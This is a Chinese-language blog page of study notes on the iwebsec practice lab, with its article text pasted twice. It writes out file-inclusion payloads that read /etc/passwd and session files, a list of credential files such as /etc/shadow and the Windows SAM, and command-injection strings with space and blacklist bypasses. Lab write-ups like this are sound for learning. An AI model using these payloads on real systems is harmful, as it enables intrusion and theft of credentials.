@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="cn">
+
+<head>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="This_is_Y">
+    
+    <title>
+        
+            iwebsec学习笔记 |
+        
+        This_is_Y
+    </title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="shortcut icon" href="/images/title.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"cn","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#33CCCC","avatar":"/images/head.png","favicon":"/images/title.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/Watch.png","description":"Life is but a Dream"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+</head>
+
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                This_is_Y
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories/cnblogs"
+                            >
+                                CNBLOGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/Game"
+                            >
+                                GAME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/ReShell"
+                            >
+                                SHELL
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories/cnblogs">CNBLOGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/Game">GAME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/ReShell">SHELL</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">iwebsec学习笔记</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/head.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">This_is_Y</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-01-17 16:16:00
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/cnblogs/">cnblogs</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>来自之前cnblog的博客<br><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/This-is-Y/p/13435718.html">源地址：https://www.cnblogs.com/This-is-Y/p/13435718.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>file=php://filter/read=convert.base64-encode/resource=index.php<br><br>SQL注入</strong></p>
+<p> 留坑</p>
+<p><strong>文件上传</strong></p>
+<p> 留坑</p>
+<p><strong>文件包含</strong></p>
+<p> 1、<a href="http://xx:xx:xx:xx:xx/fi/01.php">http://xx:xx:xx:xx:xx/fi/01.php</a></p>
+<p><a href="http://xx:xx:xx:xx:xx/fi/01.php?filename=../../../../etc/passwd">http://xx:xx:xx:xx:xx/fi/01.php?filename=../../../../etc/passwd</a></p>
+<img src="1503868-20200906145155823-157903361.png" width="1000" loading="lazy">
+
+<p> </p>
+<p>用../不断返回上一层，然后重新打开敏感文件</p>
+<p>Linux/Unix系统：<br><br>    /etc/passwd // 账户信息<br><br>    /etc/shadow // 账户密码文件<br><br>    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br><br>    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br><br>    /usr/local/app/php5/lib/php.ini // PHP相关配置<br><br>    /etc/httpd/conf/httpd.conf // Apache配置文件<br><br>    /etc/my.conf // mysql 配置文件<br><br></p>
+<p>Windows系统：<br><br>    c:\boot.ini // 查看系统版本<br><br>    c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br><br>    c:\windows\repair\sam // 存储Windows系统初次安装的密码<br><br>    c:\ProgramFiles\mysql\my.ini // MySQL配置<br><br>    c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br><br>    c:\windows\php.ini // php 配置信息<br>还可以参考：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/doulicau/article/details/106683724">https://blog.csdn.net/doulicau/article/details/106683724<i class="fas fa-external-link-alt"></i></a>　</p>
+<p>灵活使用</p>
+<p>2、<a href="http://xx:xx:xx:xx:xx/fi/02.php">http://xx:xx:xx:xx:xx/fi/02.php</a></p>
+<p>（1）：%00截断</p>
+<p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4）</p>
+<p><a href="http://xx:xx:xx:xx:xx/fi/02.php?filename=../../../../etc/passwd%00">http://xx:xx:xx:xx:xx/fi/02.php?filename=../../../../etc/passwd%00</a></p>
+<p>同时放上一些其他的截断方法</p>
+<p>（2）路径长度截断</p>
+<p>条件：windows OS，点号需要长于256；linux OS 长于4096</p>
+<p>EXP</p>
+<p>（3）点号截断</p>
+<p>条件：windows OS，点号需要长于256</p>
+<p>EXP</p>
+<p>参考自：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/Vansnc/article/details/82528395">https://blog.csdn.net/Vansnc/article/details/82528395<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+<p> </p>
+<p> 3、<a href="http://xx.xx.xx.xx:xx/fi/03.php">http://xx.xx.xx.xx:xx/fi/03.php</a></p>
+<p>session本地文件包含</p>
+<p>前提需要一个本地文件包含，比如iwebsec中的前面两个</p>
+<p>然后就能更好的利用session本地文件包含</p>
+<p>session路径：</p>
+<p>Linux：</p>
+<p>　　在这里的docker镜像中，php版本是PHP Version 5.2.17。session路径一般是/var/lib/php/session/</p>
+<img src="1503868-20200906232554554-1264704935.png" alt loading="lazy">
+
+<p> </p>
+<p> windows：</p>
+<p>　　像我用的phpstudy一键搭建的环境，php版本为PHP  5.4.45。session路径是E:\phpStudy\PHPTutorial\tmp\tmp</p>
+<p>　　<img src="1503868-20200906233319545-1011432297.png" alt loading="lazy"></p>
+<p> </p>
+<p> </p>
+<p>session_start()解释：<br>1.session的工作原理<br>（1）首先使用session_start()函数进行初始换</p>
+<p>（2）当执行PHP脚本时，通过使用SESSION超全局变量注册session变量。</p>
+<p>（3）当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.savepath指定，下次浏览网页时可以加载使用。2.sessionstart()做了哪些初始化工作（1）读取名为PHPSESSID（如果没有改变默认值）的cookie值，假使为abc123。（2.1）若读取到PHPSESSID这个COOKIE，创建SESSION变量，并从相应的目录中（可以再php.ini中设置）读取SESSabc123（默认是这种命名方式）文件,将字符装在入SESSION变量中;（2.2） 若没有读取到PHPSESSID这个COOKIE，也会创建S​ESSION超全局变量注册session变量。同时创建一个sess_abc321(名称为随机值)的session文件,同时将abc321作为PHPSESSID的cookie值返回给浏览器端。</p>
+<p>漏洞分析<br>此php会将获取到的GET型ctfs变量的值存入到session中。当访问<a class="link" target="_blank" rel="noopener" href="http://www.ctfs-wiki/session.php?ctfs=ctfs">http://www.ctfs-wiki/session.php?ctfs=ctfs<i class="fas fa-external-link-alt"></i></a> 后，会在/var/lib/php/session目录下存储session的值。session的文件名为sess+sessionid，sessionid可以通过在浏览器F12的网络中获取</p>
+<p>这里payload为<a href="http://xx.xx.xx.xx:xx/fi/03.php?iwebsec=&lt;?phpphpinfo()">http://xx.xx.xx.xx:xx/fi/03.php?iwebsec=&lt;?phpphpinfo()</a>;?&gt;</p>
+<p>F12查看cookies中的PHPSESSID为dg4cqgdu1t7t7a9nb375169qr0</p>
+<img src="1503868-20200908124221960-850820530.png" width="1000" loading="lazy">
+
+<p> </p>
+<p>进入服务器查看文件</p>
+<img src="1503868-20200908124552679-1419438010.png" alt loading="lazy">
+
+<p> </p>
+<p> 　　`1q2w3wwewq2e23</p>
+<p> 成功写入</p>
+<p>用之前的本地文件包含漏洞读取这个文件</p>
+<p>payload:<a href="http://xx.xx.xx.xx:xx/fi/01.php?filename=../../../../var/lib/php/session/sess_dg4cqgdu1t7t7a9nb375169qr0">http://xx.xx.xx.xx:xx/fi/01.php?filename=../../../../var/lib/php/session/sess_dg4cqgdu1t7t7a9nb375169qr0</a></p>
+<img src="1503868-20200908130359402-1720143403.png" width="1000" loading="lazy">
+
+<p> </p>
+<p> </p>
+<ul>
+<li>php://filter伪协议</li>
+<li>php://input伪协议</li>
+<li>file://伪协议利用</li>
+<li>data://伪协议利用</li>
+</ul>
+<p><strong>命令执行</strong> </p>
+<p><strong>1、</strong></p>
+ <img src="1503868-20210113215458099-478559894.png" width="1000" loading="lazy">
+
+<p> </p>
+<p>url:<a class="link" target="_blank" rel="noopener" href="http://ip:32110/exec/01.php?ip=127.0.0.1">http://ip:32110/exec/01.php?ip=127.0.0.1<i class="fas fa-external-link-alt"></i></a></p>
+<p>可以猜测是ifconfig ip</p>
+<p>在后面加上 ; 分隔开</p>
+<p><a class="link" target="_blank" rel="noopener" href="http://ip:32110/exec/01.php?ip=127.0.0.1;cat">http://ip:32110/exec/01.php?ip=127.0.0.1;cat<i class="fas fa-external-link-alt"></i></a> /etc/passwd</p>
+<img src="1503868-20210113215657902-469851191.png" width="1000" loading="lazy">
+
+<p> </p>
+<p><strong>2、</strong></p>
+<p>第二个是空格绕过，如果参数中出现了空格，直接报error</p>
+<p>URL：<a class="link" target="_blank" rel="noopener" href="http://ip:32110/exec/02.php?ip=127.0.0.1;cat%20/etc/passwd">http://IP:32110/exec/02.php?ip=127.0.0.1;cat%20/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
+<img src="1503868-20210113220529825-605193088.png" width="1000" loading="lazy">
+
+<p> </p>
+<p> </p>
+<p>在linux bash中可以用以下几个符号代替空格</p>
+<p>&lt;</p>
+<p>${IFS}</p>
+<p>$IFS$9</p>
+<img src="1503868-20210113220336958-523652881.png" alt loading="lazy">
+
+<p>如果是PHP环境，也可以用%09</p>
+<p>URL：<a class="link" target="_blank" rel="noopener" href="http://ip:32110/exec/02.php?ip=127.0.0.1;cat%09/etc/passwd">http://IP:32110/exec/02.php?ip=127.0.0.1;cat%09/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
+<img src="1503868-20210113220412739-437139119.png" width="1000" loading="lazy">
+
+<p> </p>
+<p> </p>
+<p><strong>3、</strong></p>
+<p>第三个是黑名单，关键命令绕过</p>
+<img src="1503868-20210113220842357-138091093.png" alt loading="lazy">
+
+<p> </p>
+<p>cat命令被拉进黑名单了</p>
+<p>用a=ca;b=t;$a$b /etc/passwd绕过。</p>
+<p> URL：<a class="link" target="_blank" rel="noopener" href="http://ip:32110/exec/03.php?ip=127.0.0.1;a=ca;b=t;$a$b%20/etc/passwd">http://IP:32110/exec/03.php?ip=127.0.0.1;a=ca;b=t;$a$b%20/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+<p> </p>
+<p><strong>4、</strong></p>
+<p> </p>
+<p><strong>5、</strong></p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p><strong>代码执行</strong></p>
+<p>  留坑</p>
+<p><strong>xss</strong></p>
+<p>  留坑</p>
+<p><strong>SSRF</strong></p>
+<p>  留坑</p>
+<p><strong>XXE</strong></p>
+<p>  留坑</p>
+<p><strong>反序列化</strong></p>
+<p>  留坑 </p>
+<p><strong>中间件漏洞</strong></p>
+<p>  留坑 </p>
+<p><strong>解析漏洞</strong></p>
+<p>  留坑</p>
+<p><strong>数据库漏洞</strong></p>
+<p> 留坑</p>
+<p> </p>
+<p>————恢复内容开始————</p>
+<p><strong>file=php://filter/read=convert.base64-encode/resource=index.php<br><br>SQL注入</strong></p>
+<p> 留坑</p>
+<p><strong>文件上传</strong></p>
+<p> 留坑</p>
+<p><strong>文件包含</strong></p>
+<p> 1、<a href="http://xx:xx:xx:xx:xx/fi/01.php">http://xx:xx:xx:xx:xx/fi/01.php</a></p>
+<p><a href="http://xx:xx:xx:xx:xx/fi/01.php?filename=../../../../etc/passwd">http://xx:xx:xx:xx:xx/fi/01.php?filename=../../../../etc/passwd</a></p>
+<img src="1503868-20200906145155823-157903361.png" width="1000" loading="lazy">
+
+<p> </p>
+<p>用../不断返回上一层，然后重新打开敏感文件</p>
+<p>Linux/Unix系统：<br><br>    /etc/passwd // 账户信息<br><br>    /etc/shadow // 账户密码文件<br><br>    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br><br>    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br><br>    /usr/local/app/php5/lib/php.ini // PHP相关配置<br><br>    /etc/httpd/conf/httpd.conf // Apache配置文件<br><br>    /etc/my.conf // mysql 配置文件<br><br></p>
+<p>Windows系统：<br><br>    c:\boot.ini // 查看系统版本<br><br>    c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br><br>    c:\windows\repair\sam // 存储Windows系统初次安装的密码<br><br>    c:\ProgramFiles\mysql\my.ini // MySQL配置<br><br>    c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br><br>    c:\windows\php.ini // php 配置信息<br>还可以参考：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/doulicau/article/details/106683724">https://blog.csdn.net/doulicau/article/details/106683724<i class="fas fa-external-link-alt"></i></a>　</p>
+<p>灵活使用</p>
+<p>2、<a href="http://xx:xx:xx:xx:xx/fi/02.php">http://xx:xx:xx:xx:xx/fi/02.php</a></p>
+<p>（1）：%00截断</p>
+<p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4）</p>
+<p><a href="http://xx:xx:xx:xx:xx/fi/02.php?filename=../../../../etc/passwd%00">http://xx:xx:xx:xx:xx/fi/02.php?filename=../../../../etc/passwd%00</a></p>
+<p>同时放上一些其他的截断方法</p>
+<p>（2）路径长度截断</p>
+<p>条件：windows OS，点号需要长于256；linux OS 长于4096</p>
+<p>EXP</p>
+<p>（3）点号截断</p>
+<p>条件：windows OS，点号需要长于256</p>
+<p>EXP</p>
+<p>参考自：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/Vansnc/article/details/82528395">https://blog.csdn.net/Vansnc/article/details/82528395<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+<p> </p>
+<p> 3、<a href="http://xx.xx.xx.xx:xx/fi/03.php">http://xx.xx.xx.xx:xx/fi/03.php</a></p>
+<p>session本地文件包含</p>
+<p>前提需要一个本地文件包含，比如iwebsec中的前面两个</p>
+<p>然后就能更好的利用session本地文件包含</p>
+<p>session路径：</p>
+<p>Linux：</p>
+<p>　　在这里的docker镜像中，php版本是PHP Version 5.2.17。session路径一般是/var/lib/php/session/</p>
+<img src="1503868-20200906232554554-1264704935.png" alt loading="lazy">
+
+<p> </p>
+<p> windows：</p>
+<p>　　像我用的phpstudy一键搭建的环境，php版本为PHP  5.4.45。session路径是E:\phpStudy\PHPTutorial\tmp\tmp</p>
+<p>　　<img src="1503868-20200906233319545-1011432297.png" alt loading="lazy"></p>
+<p> </p>
+<p> </p>
+<p>session_start()解释：<br>1.session的工作原理<br>（1）首先使用session_start()函数进行初始换</p>
+<p>（2）当执行PHP脚本时，通过使用SESSION超全局变量注册session变量。</p>
+<p>（3）当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.savepath指定，下次浏览网页时可以加载使用。2.sessionstart()做了哪些初始化工作（1）读取名为PHPSESSID（如果没有改变默认值）的cookie值，假使为abc123。（2.1）若读取到PHPSESSID这个COOKIE，创建SESSION变量，并从相应的目录中（可以再php.ini中设置）读取SESSabc123（默认是这种命名方式）文件,将字符装在入SESSION变量中;（2.2） 若没有读取到PHPSESSID这个COOKIE，也会创建S​ESSION超全局变量注册session变量。同时创建一个sess_abc321(名称为随机值)的session文件,同时将abc321作为PHPSESSID的cookie值返回给浏览器端。</p>
+<p>漏洞分析<br>此php会将获取到的GET型ctfs变量的值存入到session中。当访问<a class="link" target="_blank" rel="noopener" href="http://www.ctfs-wiki/session.php?ctfs=ctfs">http://www.ctfs-wiki/session.php?ctfs=ctfs<i class="fas fa-external-link-alt"></i></a> 后，会在/var/lib/php/session目录下存储session的值。session的文件名为sess+sessionid，sessionid可以通过在浏览器F12的网络中获取</p>
+<p>这里payload为<a href="http://xx.xx.xx.xx:xx/fi/03.php?iwebsec=&lt;?phpphpinfo()">http://xx.xx.xx.xx:xx/fi/03.php?iwebsec=&lt;?phpphpinfo()</a>;?&gt;</p>
+<p>F12查看cookies中的PHPSESSID为dg4cqgdu1t7t7a9nb375169qr0</p>
+<img src="1503868-20200908124221960-850820530.png" width="1000" loading="lazy">
+
+<p> </p>
+<p>进入服务器查看文件</p>
+<img src="1503868-20200908124552679-1419438010.png" alt loading="lazy">
+
+<p> </p>
+<p> 　　`1q2w3wwewq2e23</p>
+<p> 成功写入</p>
+<p>用之前的本地文件包含漏洞读取这个文件</p>
+<p>payload:<a href="http://xx.xx.xx.xx:xx/fi/01.php?filename=../../../../var/lib/php/session/sess_dg4cqgdu1t7t7a9nb375169qr0">http://xx.xx.xx.xx:xx/fi/01.php?filename=../../../../var/lib/php/session/sess_dg4cqgdu1t7t7a9nb375169qr0</a></p>
+<img src="1503868-20200908130359402-1720143403.png" width="1000" loading="lazy">
+
+<p> </p>
+<p> </p>
+<ul>
+<li>php://filter伪协议</li>
+<li>php://input伪协议</li>
+<li>file://伪协议利用</li>
+<li>data://伪协议利用</li>
+</ul>
+<p><strong>命令执行</strong> </p>
+<p><strong>1、</strong></p>
+ <img src="1503868-20210113215458099-478559894.png" width="1000" loading="lazy">
+
+<p> </p>
+<p>url:<a class="link" target="_blank" rel="noopener" href="http://ip:32110/exec/01.php?ip=127.0.0.1">http://ip:32110/exec/01.php?ip=127.0.0.1<i class="fas fa-external-link-alt"></i></a></p>
+<p>可以猜测是ifconfig ip</p>
+<p>在后面加上 ; 分隔开</p>
+<p><a class="link" target="_blank" rel="noopener" href="http://ip:32110/exec/01.php?ip=127.0.0.1;cat">http://ip:32110/exec/01.php?ip=127.0.0.1;cat<i class="fas fa-external-link-alt"></i></a> /etc/passwd</p>
+<img src="1503868-20210113215657902-469851191.png" width="1000" loading="lazy">
+
+<p> </p>
+<p><strong>2、</strong></p>
+<p>第二个是空格绕过，如果参数中出现了空格，直接报error</p>
+<p>URL：<a class="link" target="_blank" rel="noopener" href="http://ip:32110/exec/02.php?ip=127.0.0.1;cat%20/etc/passwd">http://IP:32110/exec/02.php?ip=127.0.0.1;cat%20/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
+<img src="1503868-20210113220529825-605193088.png" width="1000" loading="lazy">
+
+<p> </p>
+<p> </p>
+<p>在linux bash中可以用以下几个符号代替空格</p>
+<p>&lt;</p>
+<p>${IFS}</p>
+<p>$IFS$9</p>
+<img src="1503868-20210113220336958-523652881.png" alt loading="lazy">
+
+<p>如果是PHP环境，也可以用%09</p>
+<p>URL：<a class="link" target="_blank" rel="noopener" href="http://ip:32110/exec/02.php?ip=127.0.0.1;cat%09/etc/passwd">http://IP:32110/exec/02.php?ip=127.0.0.1;cat%09/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
+<img src="1503868-20210113220412739-437139119.png" width="1000" loading="lazy">
+
+<p> </p>
+<p> </p>
+<p><strong>3、</strong></p>
+<p>第三个是黑名单，关键命令绕过</p>
+<img src="1503868-20210113220842357-138091093.png" alt loading="lazy">
+
+<p> </p>
+<p>cat命令被拉进黑名单了</p>
+<p>用a=ca;b=t;$a$b /etc/passwd绕过。</p>
+<p> URL：<a class="link" target="_blank" rel="noopener" href="http://ip:32110/exec/03.php?ip=127.0.0.1;a=ca;b=t;$a$b%20/etc/passwd">http://IP:32110/exec/03.php?ip=127.0.0.1;a=ca;b=t;$a$b%20/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+<p> </p>
+<p><strong>4、</strong></p>
+<p> </p>
+<p><strong>5、</strong></p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p> </p>
+<p><strong>代码执行</strong></p>
+<p>  留坑</p>
+<p><strong>xss</strong></p>
+<p>  留坑</p>
+<p><strong>SSRF</strong></p>
+<p>  留坑</p>
+<p><strong>XXE</strong></p>
+<p>  留坑</p>
+<p><strong>反序列化</strong></p>
+<p>  留坑 </p>
+<p><strong>中间件漏洞</strong></p>
+<p>  留坑 </p>
+<p><strong>解析漏洞</strong></p>
+<p>  留坑</p>
+<p><strong>数据库漏洞</strong></p>
+<p> 留坑</p>
+<p> </p>
+<p>————恢复内容结束————</p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/03/06/go%E7%AC%94%E8%AE%B0/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">go笔记</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/01/17/XML%E7%AC%94%E8%AE%B0/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">XML笔记</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script data-pjax
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'pnLUL03RCIjbXBNX6m4sBrtq-gzGzoHsz',
+                    appKey: 'itjAi31G55tfhpSKJiuLDe2g',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '生命是上天的馈赠，我不想虚度年华',
+                    lang: 'cn'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = 'This_is_Y';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('true') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">This_is_Y</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
